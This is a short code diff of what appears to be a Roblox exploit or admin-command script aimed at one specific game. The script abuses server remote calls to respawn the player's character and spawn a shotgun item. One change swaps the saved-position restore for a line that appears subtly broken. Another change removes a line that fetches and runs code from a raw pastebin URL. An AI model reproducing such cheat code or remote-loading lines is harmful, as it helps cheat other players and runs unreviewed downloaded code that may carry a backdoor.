@@ -623,7 +623,7 @@ if game.PlaceId == 155615604 then
         local savedcf = GetPos()
         local savedcamcf = GetCamPos()
         workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Position = GetPos()
         workspace.CurrentCamera.CFrame = savedcamcf
         workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
       end
@@ -1160,7 +1160,6 @@ if game.PlaceId == 155615604 then
           v.Parent = workspace
         end
       end)
-      Loadstring("https://pastebin.com/raw/9ab2s523")
     end
     if Command("beam") then
       local Player = GetPlayer(Arg2)
